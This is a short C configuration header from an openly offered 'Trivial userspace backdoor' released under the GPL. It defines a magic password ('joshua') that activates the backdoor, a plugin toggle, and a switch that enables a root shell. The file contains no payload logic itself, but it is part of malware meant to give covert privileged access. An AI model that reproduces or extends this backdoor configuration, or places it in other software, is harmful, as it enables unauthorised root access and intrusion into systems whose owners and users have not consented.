/*
    Trivial userspace backdoor 
    Copyright (C) 2012  Emanuele Paiano
        nixw0rm@gmail.com

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


/* magic keyword to enable backd00r */
#define ARG1 "joshua"


/* PLUGINS */

/* enable raw plugin 1=enable 0=disable */
#define RAW 0

/* enable rootshell */
#define SHELL 1
